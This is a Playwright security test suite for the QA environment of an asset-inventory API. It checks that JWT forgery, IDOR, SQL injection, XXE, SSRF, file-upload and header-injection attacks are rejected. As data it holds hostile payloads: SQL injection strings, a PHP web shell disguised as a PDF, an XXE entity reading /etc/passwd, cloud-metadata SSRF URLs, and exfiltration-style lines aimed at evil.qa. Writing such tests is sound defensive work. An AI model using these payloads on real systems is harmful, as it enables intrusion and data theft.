/*
 * SEGURIDAD de la API por el borde de QA (OWASP Top 10 / API Security Top 10 / ASVS como guía).
 * Solo contra QA. Cada prueba documenta el ataque y lo que debe pasar:
 *  - JWT (alg none, firma alterada, refresh como access, revocación), 2FA (reutilización),
 *    enumeración de usuarios (mensaje y tiempo).
 *  - Barrido de las 325 rutas: sin token = 401; ninguna ruta 5xx con entrada vacía o hostil;
 *    CONSULTA (solo lectura) no escribe; IDOR del técnico de la sede Sur sobre recursos de la Norte.
 *  - Asignación masiva, inyección SQL (búsqueda, filtros, orden), CSV con fórmulas, HTML en PDF,
 *    cabeceras de correo, archivos (tipo real, tamaño, nombres, XXE, bomba zip) y SSRF del logo.
 *  - Borde: CORS, cabeceras, operativos bloqueados, errores sin datos internos.
 */
import { readFileSync } from 'node:fs';
import { createHmac } from 'node:crypto';
import JSZip from 'jszip';
import { test, expect, type APIResponse } from '@playwright/test';
import { consulta, contextoApi, correos, esperarCorreo, sesionApi, SEDES, sufijo, totp, usuario, type Sesion } from '../soporte';
import { altaApi, area, hex, persona, tipoMovimiento, tipoYModelo } from '../datos';
import { pdfATexto } from '../qr';

test.describe.configure({ mode: 'serial' });

let jefe: Sesion;
let raiz: Sesion;
let iam: Sesion;
let tecnicoSur: Sesion;
let consultaNorte: Sesion;
let cat: { tipo: number; modelo: number; prefijo: string };

test.beforeAll(async () => {
  [jefe, raiz, iam, tecnicoSur, consultaNorte] = await Promise.all([sesionApi('qa_jefe_ti'), sesionApi('qa_superadmin'), sesionApi('qa_admin_seg'),
    sesionApi('qa_tecnico_sur'), sesionApi('qa_consulta_norte')]);
  cat = await tipoYModelo();
});

const b64 = (o: object): string => Buffer.from(JSON.stringify(o)).toString('base64url');
const sinDatosInternos = (t: string): void => {
  expect(t, 'el error no debe exponer detalles internos').not.toMatch(/ORA-\d|Doctrine|Symfony\\|stack|\.php|SQLSTATE|oci_|\/app\//i);
};

// ---------------------------------------------------------------- JWT y sesión
test('JWT: alg none, firma alterada, rol cambiado y refresh como access -> 401', async () => {
  const [h, p] = jefe.token.split('.');
  const payload = JSON.parse(Buffer.from(p, 'base64url').toString());
  const api = await contextoApi();
  const probar = async (t: string) => (await api.get('/api/v1/me', { headers: { Authorization: `Bearer ${t}` } })).status();
  expect(await probar(`${b64({ alg: 'none', typ: 'JWT' })}.${p}.`)).toBe(401);
  expect(await probar(`${b64({ alg: 'none', typ: 'JWT' })}.${b64({ ...payload, role: 'SUPER_ADMIN' })}.`)).toBe(401);
  expect(await probar(`${h}.${b64({ ...payload, role: 'SUPER_ADMIN' })}.${jefe.token.split('.')[2]}`)).toBe(401);
  // Firmado con una clave adivinada (HS256 con «secret»).
  const datos = `${h}.${b64({ ...payload, role: 'SUPER_ADMIN' })}`;
  expect(await probar(`${datos}.${createHmac('sha256', 'secret').update(datos).digest('base64url')}`)).toBe(401);
  // alg distinto (HS512) y token vacío o basura.
  expect(await probar(`${b64({ alg: 'HS512', typ: 'JWT' })}.${p}.x`)).toBe(401);
  expect(await probar('basura')).toBe(401);
  expect(payload.type ?? payload.typ).toBe('access');
  expect(payload.exp - payload.iat).toBeLessThanOrEqual(15 * 60);
});

test('sesión: tras logout el access token queda revocado; logout-all cierra las demás sesiones', async () => {
  const s1 = await sesionApi('qa_contabilidad');
  const s2 = await sesionApi('qa_contabilidad');
  expect((await s1.ctx.get('/api/v1/me')).status()).toBe(200);
  expect((await s1.ctx.post('/api/v1/login/logout')).status()).toBeLessThan(300);
  const tras = await s1.ctx.get('/api/v1/me');
  expect(tras.status()).toBe(401);
  expect((await s2.ctx.get('/api/v1/me')).status()).toBe(200);
  expect((await s2.ctx.post('/api/v1/login/logout-all')).status()).toBeLessThan(300);
  expect((await s2.ctx.get('/api/v1/me')).status()).toBe(401);
});

test('2FA: un código TOTP no se reutiliza y el reto no sirve dos veces', async () => {
  const u = usuario('qa_totp');
  const api = await contextoApi();
  const reto = async () => (await (await api.post('/api/v1/login/access-token', { form: { username: u.username, password: u.password } })).json()).challenge_token;
  // Se espera a un paso nuevo (lo marca la base) para no chocar con otras pruebas.
  await new Promise((r) => setTimeout(r, 31_000 - (Date.now() % 30_000)));
  const c1 = await reto();
  const code = totp(u.secreto_totp!);
  expect((await api.post('/api/v1/login/2fa/verify', { data: { challenge_token: c1, code } })).status()).toBe(200);
  expect((await api.post('/api/v1/login/2fa/verify', { data: { challenge_token: c1, code } })).status(), 'reto reutilizado').toBeGreaterThanOrEqual(400);
  const c2 = await reto();
  expect((await api.post('/api/v1/login/2fa/verify', { data: { challenge_token: c2, code } })).status(), 'mismo código, otro reto').toBeGreaterThanOrEqual(400);
});

test('enumeración: usuario inexistente y contraseña errónea dan la misma respuesta y un tiempo parecido', async () => {
  const api = await contextoApi();
  const medir = async (username: string) => {
    const t0 = performance.now();
    const r = await api.post('/api/v1/login/access-token', { form: { username, password: 'Incorrecta.123!' } });
    return { ms: performance.now() - t0, status: r.status(), cuerpo: await r.text() };
  };
  const existentes = []; const inexistentes = [];
  for (let i = 0; i < 6; i++) {
    existentes.push(await medir('qa_bloqueo'));
    inexistentes.push(await medir(`nadie_${sufijo()}`));
  }
  expect(new Set([...existentes, ...inexistentes].map((r) => `${r.status} ${r.cuerpo}`)).size).toBe(1);
  const mediana = (v: number[]) => v.sort((a, b) => a - b)[Math.floor(v.length / 2)];
  const dif = Math.abs(mediana(existentes.map((r) => r.ms)) - mediana(inexistentes.map((r) => r.ms)));
  test.info().annotations.push({ type: 'tiempo', description: `diferencia de medianas ${dif.toFixed(0)} ms` });
  expect(dif, 'el hash señuelo iguala el tiempo').toBeLessThan(150);
  // Restablecimiento: misma respuesta exista o no.
  const r1 = await api.post('/api/v1/login/password-reset/request', { data: { identifier: 'qa_bloqueo' } });
  const r2 = await api.post('/api/v1/login/password-reset/request', { data: { identifier: `nadie_${sufijo()}` } });
  expect([r1.status(), await r1.text()]).toEqual([r2.status(), await r2.text()]);
  await (await sesionApi('qa_superadmin')).ctx.post(`/api/v1/org/usuarios/${usuario('qa_bloqueo').id}/unlock`);
});

// ---------------------------------------------------------------- Barrido de rutas
interface Ruta { metodo: string; ruta: string }
const RUTAS: Ruta[] = readFileSync('/qa/rutas.md', 'utf8').split('\n')
  .map((l) => l.match(/^\| \[x\] \| (GET|POST|PUT|PATCH|DELETE) \| `([^`]+)` \|/))
  .filter((m): m is RegExpMatchArray => !!m).map((m) => ({ metodo: m[1], ruta: m[2] }));
const PUBLICAS = /^\/(health|metrics|health\/full)?$|^\/api\/v1\/login\/(sso\/|access-token|2fa\/verify|refresh|logout|password-reset)|^\/api\/v1\/gov\/config(\/logo)?$/;

function concretar(ruta: string, ids: Record<string, string | number>): string {
  return ruta.replace(/\{([^}]+)\}/g, (_, p: string) => String(ids[p] ?? ids.id ?? '1'));
}

async function pedir(ctx: Sesion['ctx'] | Awaited<ReturnType<typeof contextoApi>>, r: Ruta, url: string, data?: unknown): Promise<APIResponse> {
  const op = { failOnStatusCode: false, data, maxRedirects: 0 };
  switch (r.metodo) {
    case 'GET': return ctx.get(url, op);
    case 'POST': return ctx.post(url, op);
    case 'PUT': return ctx.put(url, op);
    case 'PATCH': return ctx.patch(url, op);
    default: return ctx.delete(url, op);
  }
}

test(`barrido de las ${RUTAS.length} rutas sin token: todo lo no público responde 401`, async () => {
  expect(RUTAS.length).toBeGreaterThanOrEqual(320);
  const api = await contextoApi();
  const fallas: string[] = [];
  for (const r of RUTAS) {
    if (PUBLICAS.test(r.ruta) || r.ruta === '/') continue;
    const url = concretar(r.ruta, { id: '00000000-0000-0000-0000-000000000001', provider: 'google', clave: 'marcas', evento: 'asignacion' });
    const res = await pedir(api, r, url);
    // Rutas con identificador numérico: con UUID no casan (404 antes de autenticar); se prueba con 1.
    const final = res.status() === 404 ? await pedir(api, r, concretar(r.ruta, { id: 1, provider: 'google', clave: 'marcas', evento: 'asignacion' })) : res;
    if (final.status() !== 401) fallas.push(`${r.metodo} ${r.ruta} -> ${final.status()}`);
  }
  expect(fallas).toEqual([]);
});

test('barrido con entrada hostil por rol: ninguna ruta 5xx ni filtra detalles internos; CONSULTA no escribe', async () => {
  test.setTimeout(600_000);
  const hostil = { q: "' OR 1=1--", nombre: '<script>alert(1)</script>', id: "1' AND SLEEP(5)--", limit: -1, page: 'x', sort: 'ACT_Costo; DROP TABLE X' };
  const ids = { id: "1'--", activo_id: 'zz', persona_id: '..%2F..%2Fetc', provider: 'evil', clave: '../../x', origen: 1, destino: 2, evento: '<x>',
    session_id: 'x', usuario_id: '00000000-0000-0000-0000-000000000000', tipo_id: 999999, toma_id: 999999, faltante_id: 999999, aprobacion_id: 999999,
    movimiento_id: 'x', mantenimiento_id: 'x', detalle_id: 999999, esp_id: 999999, componente_id: 'x', kit_id: 999999, item_id: 999999, orden_id: 999999,
    licencia_id: 999999 };
  const cincos: string[] = [];
  const escrituras: string[] = [];
  for (const [s, nombre] of [[consultaNorte, 'CONSULTA'], [tecnicoSur, 'TECNICO'], [jefe, 'JEFE_TI']] as const) {
    for (const r of RUTAS) {
      if (r.ruta.startsWith('/api/v1/login/logout') || r.ruta.includes('/sessions') || r.ruta.endsWith('/logout-all') || r.ruta === '/') continue;
      const url = concretar(r.ruta, ids) + (r.metodo === 'GET' ? `?q=${encodeURIComponent(hostil.q)}&sort=${encodeURIComponent(hostil.sort)}&limit=-1` : '');
      const res = await pedir(s.ctx, r, url, r.metodo === 'GET' || r.metodo === 'DELETE' ? undefined : hostil);
      const cuerpo = await res.text();
      if (res.status() >= 500) cincos.push(`${nombre} ${r.metodo} ${r.ruta} -> ${res.status()} ${cuerpo.slice(0, 120)}`);
      if (/ORA-\d|SQLSTATE|Doctrine\\|\.php on line/i.test(cuerpo)) cincos.push(`${nombre} ${r.metodo} ${r.ruta}: detalle interno`);
      if (nombre === 'CONSULTA' && r.metodo !== 'GET' && res.status() < 300 && !r.ruta.startsWith('/api/v1/me')
        && !/\/(search|etiquetas\.pdf|previsualizar|probar)/.test(r.ruta)) {
        escrituras.push(`${r.metodo} ${r.ruta} -> ${res.status()}`);
      }
    }
  }
  expect(cincos, 'respuestas 5xx o con detalles internos').toEqual([]);
  expect(escrituras, 'CONSULTA (solo lectura) no debe escribir').toEqual([]);
});

test('IDOR entre sedes: el técnico de la sede Sur no lee ni opera recursos de la Norte en ninguna ruta con identificador', async () => {
  test.setTimeout(300_000);
  const a = await altaApi(jefe, cat.modelo, cat.tipo, { SED_Sede: SEDES.A });
  const p = await persona(SEDES.A, 'Idor');
  const m = await (await jefe.ctx.post('/api/v1/trazabilidad/movimientos', { data: { ACT_Activo: a.ACT_Activo, PER_Persona: p, ARE_Area: await area(SEDES.A),
    TMO_Tipo_Movimiento: await tipoMovimiento('Asignación'), MOV_Motivo: 'IDOR' } })).json();
  const adj = await (await jefe.ctx.post(`/api/v1/adjuntos/activos/${a.ACT_Activo}`, {
    multipart: { file: { name: 'secreto.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4\n%%EOF\n') } } })).json();
  const ids: Record<string, string | number> = { id: a.ACT_Activo, activo_id: a.ACT_Activo, persona_id: p, movimiento_id: m.MOV_Movimiento };
  const fugas: string[] = [];
  const conIds = RUTAS.filter((r) => /\{(id|activo_id|persona_id|movimiento_id)\}/.test(r.ruta)
    && /\/(core|trazabilidad|inventario|org\/personas|productividad|soft\/activos|soft\/personas|adjuntos)\//.test(r.ruta));
  for (const r of conIds) {
    const url = concretar(r.ruta, ids);
    const res = await pedir(tecnicoSur.ctx, r, url, r.metodo === 'GET' || r.metodo === 'DELETE' ? undefined : { MOV_Motivo: 'x', ACT_Hostname: 'IDOR' });
    const texto = await res.text();
    const filtra = res.status() < 300 && (texto.includes(a.ACT_Codigo_Interno) || texto.includes(hex(a.ACT_Activo)) || texto.includes(a.ACT_Activo) || texto.includes('IDOR'));
    if (filtra) fugas.push(`${r.metodo} ${r.ruta} -> ${res.status()}`);
  }
  const descarga = await tecnicoSur.ctx.get(`/api/v1/adjuntos/${adj.ADJ_Adjunto ?? adj.id}/download`);
  if (descarga.status() < 300) fugas.push('adjunto ajeno descargado');
  test.info().annotations.push({ type: 'rutas probadas', description: String(conIds.length) });
  expect(fugas).toEqual([]);
  // Y en la base nada cambió por el técnico Sur.
  expect((await consulta<any>('SELECT "ACT_Hostname" H FROM "INV_ACTIVO" WHERE "ACT_Activo" = :a', { a: hex(a.ACT_Activo) }))[0].H).not.toBe('IDOR');
});

// ---------------------------------------------------------------- Asignación masiva y escalamiento
test('asignación masiva y escalamiento de privilegios', async () => {
  const a = await altaApi(jefe, cat.modelo, cat.tipo);
  const r = await jefe.ctx.patch(`/api/v1/core/activos/${a.ACT_Activo}`, {
    data: { ACT_Hostname: 'MASIVO', ACT_Codigo_Interno: 'HACK00001', ACT_Activo: '00000000-0000-0000-0000-000000000000', ACT_Creado_En: '2000-01-01', KDX_Hash: 'x' },
  });
  expect(r.status()).toBeLessThan(500);
  // El código interno es corregible por contrato (mismo esquema que el backend anterior), con unicidad y
  // bitácora; el identificador, la fecha de creación y el sello del kardex no se tocan desde el cuerpo.
  const fila = (await consulta<any>('SELECT "ACT_Activo" I, "ACT_Codigo_Interno" C FROM "INV_ACTIVO" WHERE "ACT_Activo" = :a', { a: hex(a.ACT_Activo) }))[0];
  expect(fila.I).toBe(hex(a.ACT_Activo));
  const bitacora = await consulta<any>('SELECT COUNT(*) N FROM "INV_AUDITORIA_SISTEMA" WHERE "AUD_Entidad_Afectada" = \'INV_ACTIVO\' '
    + 'AND DBMS_LOB.INSTR("AUD_Snapshot_JSON", :c) > 0', { c: String(fila.C) });
  expect(Number(bitacora[0].N), 'el cambio de código queda en la bitácora').toBeGreaterThan(0);
  const otro = await altaApi(jefe, cat.modelo, cat.tipo);
  const dup = await jefe.ctx.patch(`/api/v1/core/activos/${otro.ACT_Activo}`, { data: { ACT_Codigo_Interno: fila.C } });
  expect(dup.status(), 'código duplicado').toBeGreaterThanOrEqual(400);
  // Preferencias no cambian el rol.
  await consultaNorte.ctx.patch('/api/v1/me/preferencias', { data: { tema: 'oscuro', rol: 'SUPER_ADMIN', USU_Rol: 'SUPER_ADMIN', role: 'SUPER_ADMIN' } });
  const rol = (await consulta<any>('SELECT "USU_Rol" R FROM "INV_USUARIO" WHERE "USU_Usuario" = :u', { u: usuario('qa_consulta_norte').id }))[0].R;
  expect(rol).toBe('CONSULTA');
  // ADMIN_SEGURIDAD no crea SUPER_ADMIN ni se sube a sí mismo; nadie se da alcance global sin ser SUPER_ADMIN.
  const per = await persona(SEDES.A, 'Escala');
  expect((await iam.ctx.post('/api/v1/org/usuarios', { data: { USU_Username: `x_${sufijo()}`, USU_Password: 'Zx9!kLm2Qw7rTT', USU_Rol: 'SUPER_ADMIN', PER_Persona: per } })).status()).toBe(403);
  expect((await iam.ctx.patch(`/api/v1/org/usuarios/${usuario('qa_admin_seg').id}`, { data: { USU_Rol: 'SUPER_ADMIN' } })).status()).toBeGreaterThanOrEqual(400);
  expect((await iam.ctx.patch(`/api/v1/org/usuarios/${usuario('qa_tecnico_sur').id}`, { data: { USU_Alcance_Global: true } })).status()).toBeGreaterThanOrEqual(400);
  expect((await consulta<any>('SELECT "USU_Rol" R FROM "INV_USUARIO" WHERE "USU_Usuario" = :u', { u: usuario('qa_admin_seg').id }))[0].R).toBe('ADMIN_SEGURIDAD');
});

// ---------------------------------------------------------------- Inyección
test('inyección SQL en búsqueda, filtros y orden: sin errores, sin datos de más y sin demoras inyectadas', async () => {
  const cargas = ["' OR '1'='1", "') OR 1=1--", "x' UNION SELECT \"USU_Password_Hash\" FROM \"INV_USUARIO\"--", "1; DROP TABLE \"INV_ACTIVO\"--",
    "' || DBMS_PIPE.RECEIVE_MESSAGE('a',5) || '", '%', '_', "\\'"];
  for (const q of cargas) {
    const t0 = Date.now();
    const r = await tecnicoSur.ctx.post('/api/v1/core/activos/search', { data: { q } });
    expect(Date.now() - t0, `demora con ${q}`).toBeLessThan(4000);
    const texto = await r.text();
    expect(r.status(), q).toBeLessThan(500);
    sinDatosInternos(texto);
    expect(texto).not.toMatch(/\$argon2|\$2[aby]\$/);
    if (r.status() === 200) {
      const sedes = new Set((JSON.parse(texto).items ?? []).map((i: any) => i.SED_Sede));
      expect([...sedes].every((s) => s === SEDES.B), `${q}: solo su sede`).toBe(true);
    }
  }
  for (const url of ['/api/v1/core/activos?sort=ACT_Costo%20DESC--&order=1%3BSELECT', '/api/v1/inventario/kardex?tipo=%27%20OR%201%3D1--',
    '/api/v1/org/personas?q=%27%29%20OR%201%3D1--', '/api/v1/trazabilidad/movimientos?activo_id=%27%20OR%201%3D1--', '/api/v1/gov/auditoria?entidad=%27--']) {
    const r = await jefe.ctx.get(url);
    expect(r.status(), url).toBeLessThan(500);
    sinDatosInternos(await r.text());
  }
  expect(Number((await consulta<any>('SELECT COUNT(*) N FROM "INV_ACTIVO"'))[0].N)).toBeGreaterThan(0);
});

test('CSV/Excel: un hostname con fórmula sale neutralizado en el exporte', async () => {
  const formula = `=HYPERLINK("http://evil.qa/${sufijo()}","x")`;
  await altaApi(jefe, cat.modelo, cat.tipo, { ACT_Hostname: formula.slice(0, 60) });
  const csv = await (await jefe.ctx.get('/api/v1/export/activos.csv')).text();
  const linea = csv.split(/\r?\n/).find((l) => l.includes('HYPERLINK'))!;
  expect(linea).toBeDefined();
  expect(linea).not.toMatch(/(^|[,;])"?=HYPERLINK/);
  expect(linea).toMatch(/'=HYPERLINK/);
});

test('HTML en documentos y cabeceras de correo: se imprimen como texto y no inyectan destinatarios', async () => {
  const a = await altaApi(jefe, cat.modelo, cat.tipo);
  const nombre = `<img src="//canario.qa/pdf.png"><b>N</b>`;
  const p = await persona(SEDES.A, nombre);
  const m = await (await jefe.ctx.post('/api/v1/trazabilidad/movimientos', { data: { ACT_Activo: a.ACT_Activo, PER_Persona: p, ARE_Area: await area(SEDES.A),
    TMO_Tipo_Movimiento: await tipoMovimiento('Asignación'), MOV_Motivo: 'Motivo\r\nBcc: robo@evil.qa' } })).json();
  const pdf = await jefe.ctx.get(`/api/v1/trazabilidad/acta/${m.MOV_Movimiento}?formato=pdf`);
  expect(pdf.status()).toBe(200);
  expect(await pdfATexto(await pdf.body())).toContain('<b>N</b>');
  const registro = await (await (await contextoApi()).get('http://canario.qa/registro.txt')).text();
  expect(registro, 'Dompdf no debe pedir recursos remotos').not.toContain('pdf.png');
  // El aviso de asignación no tiene destinatarios inyectados.
  await new Promise((r) => setTimeout(r, 20_000));
  expect((await correos('robo@evil.qa')).length).toBe(0);
});

// ---------------------------------------------------------------- Archivos
test('subida de archivos: tipo real, tamaño, nombres con rutas y descarga segura', async () => {
  const a = await altaApi(jefe, cat.modelo, cat.tipo);
  const subir = (name: string, mimeType: string, buffer: Buffer) => jefe.ctx.post(`/api/v1/adjuntos/activos/${a.ACT_Activo}`, { multipart: { file: { name, mimeType, buffer } } });
  const php = await subir('factura.pdf', 'application/pdf', Buffer.from('<?php system($_GET["c"]); ?>'));
  expect(php.status(), 'PHP disfrazado de PDF').toBeGreaterThanOrEqual(400);
  const svg = await subir('logo.svg', 'image/svg+xml', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'));
  expect(svg.status(), 'SVG con script').toBeGreaterThanOrEqual(400);
  const html = await subir('pagina.html', 'text/html', Buffer.from('<html><script>alert(1)</script></html>'));
  expect(html.status()).toBeGreaterThanOrEqual(400);
  const grande = await subir('grande.pdf', 'application/pdf', Buffer.concat([Buffer.from('%PDF-1.4\n'), Buffer.alloc(11 * 1024 * 1024, 0x20)]));
  expect([413, 422, 400]).toContain(grande.status());
  const ruta = await subir('../../../../etc/passwd.pdf', 'application/pdf', Buffer.from('%PDF-1.4\n%%EOF\n'));
  expect(ruta.status()).toBeLessThan(500);
  if (ruta.status() < 300) {
    const j = await ruta.json();
    expect(JSON.stringify(j)).not.toContain('../');
    const d = await jefe.ctx.get(`/api/v1/adjuntos/${j.ADJ_Adjunto ?? j.id}/download`);
    expect(d.headers()['content-disposition']).toMatch(/attachment/);
    expect(d.headers()['content-disposition']).not.toContain('..');
    expect(d.headers()['x-content-type-options']).toBe('nosniff');
  }
});

async function xlsxCon(modificar: (zip: JSZip) => void): Promise<Buffer> {
  const plantilla = await jefe.ctx.get('/api/v1/productividad/importar/activos/plantilla');
  const zip = await JSZip.loadAsync(await plantilla.body());
  modificar(zip);
  return zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE', compressionOptions: { level: 9 } });
}

test('Excel hostil en la importación: XXE no lee archivos ni sale a la red; bomba zip se rechaza sin tumbar la API', async () => {
  test.setTimeout(180_000);
  const xxe = await xlsxCon((zip) => {
    zip.file('xl/sharedStrings.xml', '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd"><!ENTITY r SYSTEM "http://canario.qa/xxe">]>'
      + '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"><si><t>&f;&r;</t></si></sst>');
  });
  const multipart = (b: Buffer) => ({ archivo: { name: 'x.xlsx', mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', buffer: b } });
  const r1 = await jefe.ctx.post('/api/v1/productividad/importar/activos/previsualizar', { multipart: multipart(xxe) });
  expect(r1.status()).toBeLessThan(500);
  expect(await r1.text()).not.toMatch(/root:x:0:0/);
  expect(await (await (await contextoApi()).get('http://canario.qa/registro.txt')).text()).not.toContain('/xxe');
  // Bomba: una hoja de ~200 MB de ceros que comprime a unos cientos de KB.
  const bomba = await xlsxCon((zip) => {
    const fila = `<row r="1">${'<c t="inlineStr"><is><t>0000000000</t></is></c>'.repeat(100)}</row>`;
    zip.file('xl/worksheets/sheet1.xml', `<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>${fila.repeat(40000)}</sheetData></worksheet>`);
  });
  test.info().annotations.push({ type: 'bomba', description: `${(bomba.length / 1024).toFixed(0)} KB comprimidos` });
  const t0 = Date.now();
  const r2 = await jefe.ctx.post('/api/v1/productividad/importar/activos/previsualizar', { multipart: multipart(bomba), timeout: 120_000 });
  test.info().annotations.push({ type: 'bomba', description: `${r2.status()} en ${Date.now() - t0} ms` });
  expect(r2.status()).toBeGreaterThanOrEqual(400);
  expect(r2.status()).not.toBe(502);
  expect((await (await contextoApi()).get('/health')).status()).toBe(200);
});

test('SSRF: el logo de las actas no se descarga de IP internas ni esquemas locales', async () => {
  const urls = ['http://canario.qa/logo.png', 'http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1:8000/metrics', 'http://minio:9000/',
    'file:///etc/passwd', 'http://[::1]/', 'http://0x7f000001/', 'gopher://canario.qa:80/_x'];
  const original = (await (await raiz.ctx.get('/api/v1/gov/config')).json()).SYS_Logo_URL;
  const a = await altaApi(jefe, cat.modelo, cat.tipo);
  const m = await (await jefe.ctx.post('/api/v1/trazabilidad/movimientos', { data: { ACT_Activo: a.ACT_Activo, PER_Persona: await persona(SEDES.A, 'Ssrf'),
    ARE_Area: await area(SEDES.A), TMO_Tipo_Movimiento: await tipoMovimiento('Asignación'), MOV_Motivo: 'SSRF' } })).json();
  const resultados: string[] = [];
  for (const u of urls) {
    const put = await raiz.ctx.put('/api/v1/gov/config', { data: { SYS_Logo_URL: u } });
    const acta = await jefe.ctx.get(`/api/v1/trazabilidad/acta/${m.MOV_Movimiento}?formato=pdf`);
    resultados.push(`${u}: config ${put.status()}, acta ${acta.status()}`);
    expect(acta.status(), u).toBeLessThan(500);
  }
  await raiz.ctx.put('/api/v1/gov/config', { data: { SYS_Logo_URL: original } });
  test.info().annotations.push({ type: 'ssrf', description: resultados.join(' | ') });
  const registro = await (await (await contextoApi()).get('http://canario.qa/registro.txt')).text();
  expect(registro, 'la API no debe contactar direcciones internas').not.toMatch(/logo\.png|GET \/_x/);
});

// ---------------------------------------------------------------- Borde
test('borde: CORS solo para el origen propio, cabeceras de seguridad, operativos bloqueados y errores sin detalles', async () => {
  const api = await contextoApi();
  const pre = await api.fetch('/api/v1/me', { method: 'OPTIONS', headers: { Origin: 'https://evil.qa', 'Access-Control-Request-Method': 'GET' } });
  expect(pre.headers()['access-control-allow-origin']).toBeUndefined();
  const propio = await api.fetch('/api/v1/me', { method: 'OPTIONS', headers: { Origin: 'https://qa.inventario.local', 'Access-Control-Request-Method': 'GET' } });
  expect(propio.headers()['access-control-allow-origin']).toBe('https://qa.inventario.local');
  const html = await api.get('/');
  const h = html.headers();
  expect(h['strict-transport-security']).toMatch(/max-age=\d{7,}/);
  expect(h['x-content-type-options']).toBe('nosniff');
  expect(h['x-frame-options']).toBe('DENY');
  expect(h['content-security-policy'] ?? '').toMatch(/default-src 'self'/);
  expect(h['content-security-policy'] ?? '').not.toMatch(/'unsafe-eval'(?!.*wasm)/);
  expect(h.server ?? '').not.toMatch(/\d/);
  expect(h['x-powered-by']).toBeUndefined();
  const apiH = (await api.get('/api/v1/me')).headers();
  expect(apiH['x-powered-by']).toBeUndefined();
  for (const ruta of ['/metrics', '/health/full', '/metrics/', '/health/full/', '/%6detrics', '/api/../metrics']) {
    // Variantes que Caddy no reconoce caen en la SPA (index.html); lo que importa es que no salgan métricas ni salud interna.
    const r = await api.get(ruta);
    const cuerpo = await r.text();
    expect(cuerpo, ruta).not.toMatch(/# HELP|# TYPE|inv_[a-z_]+\{|"oracle"\s*:|"redis"\s*:|"minio"\s*:/);
  }
  for (const [metodo, ruta] of [['GET', '/api/v1/no-existe'], ['PUT', '/api/v1/me'], ['GET', '/api/v1/core/activos/%00'], ['POST', '/api/v1/login/access-token']]) {
    const r = await api.fetch(ruta, { method: metodo, data: metodo === 'POST' ? '{"a":' : undefined, headers: { 'Content-Type': 'application/json' } });
    expect(r.status(), ruta).toBeLessThan(500);
    sinDatosInternos(await r.text());
  }
  void esperarCorreo;
});
